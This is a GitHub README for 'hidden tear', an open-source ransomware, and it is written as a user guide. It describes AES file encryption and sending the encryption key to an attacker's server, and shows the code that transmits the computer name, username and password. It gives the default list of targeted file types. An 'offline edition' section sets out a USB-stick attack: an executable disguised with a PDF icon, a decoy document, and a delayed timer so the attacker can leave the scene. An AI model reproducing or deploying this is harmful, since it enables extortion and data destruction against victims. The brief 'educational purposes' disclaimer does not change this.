# hidden tear 
Open Source Ransomware

Uploaded to GitHub for those who want to analyze the code.

### References

- https://www.tripwire.com/state-of-security/security-data-protection/cyber-security/hidden-tear-project-forbidden-fruit-is-the-sweetest/
- http://blog.trendmicro.com/trendlabs-security-intelligence/new-open-source-ransomwar-based-on-hidden-tear-and-eda2-may-target-businesses/
- https://securelist.com/blog/research/73565/hidden-tear-and-its-spin-offs/
- https://www.utkusen.com/blog/destroying-the-encryption-of-hidden-tear-ransomware.html
- https://blog.gdatasoftware.com/2016/11/29289-it-s-educational-on-the-no-1-argument-for-open-source-ransomware
- https://www.bleepingcomputer.com/news/security/hidden-tear-ransomware-developer-blackmailed-by-malware-developers-using-his-code/
- http://www.securityweek.com/variants-spawn-hidden-tear-ransomware


### 


         _     _     _     _              _                  
        | |   (_)   | |   | |            | |                 
        | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
        | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
        | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
        |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
                                                     
It's a ransomware-like file crypter sample which can be modified for specific purposes. 

**Features**
* Uses AES algorithm to encrypt files.
* Sends encryption key to a server.
* Encrypted files can be decrypted in decryption program with encryption key.
* Creates a text file on Desktop with given message.
* Small file size (12 KB)
* Undetectable by antivirus programs (15/08/2015) http://nodistribute.com/result/6a4jDwi83Fzt

**Demonstration Video**

https://www.youtube.com/watch?v=LtiRISepIfs

**Usage**

* You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)

  `string targetURL = "https://www.example.com/hidden-tear/write.php?info=";`

* The script should writes the GET parameter to a text file. Sending process running in `SendPassword()` function

  ```
  string info = computerName + "-" + userName + " " + password;
  var fullUrl = targetURL + info;
  var conent = new System.Net.WebClient().DownloadString(fullUrl);
  
  ```
* Target file extensions can be change. Default list:

```
var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
```
## Hidden Tear Offline Edition or: How I Learned to Stop Worrying and Love the Criminal Mind

What if there is a computer with full of important files and what if it has no internet or network connection. We can access it physically. But what if we were being watched, how can we execute hidden tear and get the encryption key?

**Demonstration Video**

https://www.youtube.com/watch?v=ayjv_aAwO0k

**Prerequisites**

Firstly you should have a usb stick which includes:

* exe file of hidden tear offline with a pdf icon.
* a normal pdf file like hotel reservation, ticket, lecture notes (that depends on your social engineering scenario)
* a txt file

**Workflow**

After you plugged usb stick to the computer, double click to .exe file. Don't worry, the normal pdf file will be open.

Hidden tear offline creates an encryption key and saves it into the txt file which is inside your usb stick. After than it copies exe file to the computer and executes. This process will be done in seconds. After than, you can unplug your usb stick.

Hidden tear offline will wait for some time which specified before, lets say 10 minutes. After 10 minutes, it will encrypt all the target files in computer. This part is same with the original hidden tear.

**Usage**

* Hidden tear offline will save the encryption key inside this txt file.

`string usbPassword = "adobe.txt";`

* It copies itself to this path after the first execution.

`string exePath = userDir + userName + "\\table.exe";`

* Name of the normal pdf file.

`System.Diagnostics.Process.Start("ticket.pdf");`

* `Timer1`'s interval represents the encryption start time. If you set it to 600000 miliseconds, encryption action will start after 10 minutes the first execution. If you need more time to leave the scene, you can increase the interval.

## Legal Warning

While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.

## Thanks

Special thanks to Ikikardes who helped me to publish this code.
